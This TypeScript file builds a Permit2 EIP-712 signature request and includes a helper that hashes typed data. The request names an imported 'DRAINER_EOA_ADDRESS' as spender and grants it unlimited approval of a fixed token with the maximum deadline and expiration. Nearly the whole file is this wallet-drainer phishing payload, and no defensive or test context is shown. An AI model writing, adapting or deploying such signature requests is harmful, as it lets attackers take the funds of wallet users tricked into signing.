import { DRAINER_EOA_ADDRESS } from '@/config/constants'
import { BigNumber } from 'ethers'
import { hexZeroPad, _TypedDataEncoder } from 'ethers/lib/utils'

export type EIP712TypedData = ReturnType<typeof _TypedDataEncoder.getPayload>

export const hashTypedData = (typedData: EIP712TypedData): string => {
  // `ethers` doesn't require `EIP712Domain` and otherwise throws
  const { EIP712Domain: _, ...types } = typedData.types
  return _TypedDataEncoder.hash(typedData.domain, types, typedData.message)
}

const UNLIMITED_APPROVAL_AMOUNT = BigNumber.from(2).pow(160).sub(1)
const MAX_DEADLINE = BigNumber.from(2).pow(48).sub(1)
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'

export const getPermit2TypedData = (chainId: number) => {
  return {
    types: {
      EIP712Domain: [
        {
          name: 'name',
          type: 'string',
        },
        {
          name: 'chainId',
          type: 'uint256',
        },
        {
          name: 'verifyingContract',
          type: 'address',
        },
      ],
      PermitSingle: [
        {
          name: 'details',
          type: 'PermitDetails',
        },
        {
          name: 'spender',
          type: 'address',
        },
        {
          name: 'sigDeadline',
          type: 'uint256',
        },
      ],
      PermitDetails: [
        {
          name: 'token',
          type: 'address',
        },
        {
          name: 'amount',
          type: 'uint160',
        },
        {
          name: 'expiration',
          type: 'uint48',
        },
        {
          name: 'nonce',
          type: 'uint48',
        },
      ],
    },
    primaryType: 'PermitSingle',
    domain: {
      name: 'Permit2',
      chainId,
      verifyingContract: PERMIT2_ADDRESS,
    },
    message: {
      spender: DRAINER_EOA_ADDRESS,
      sigDeadline: MAX_DEADLINE,
      details: {
        token: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
        amount: UNLIMITED_APPROVAL_AMOUNT,
        expiration: MAX_DEADLINE,
        nonce: 0,
      },
    },
  }
}
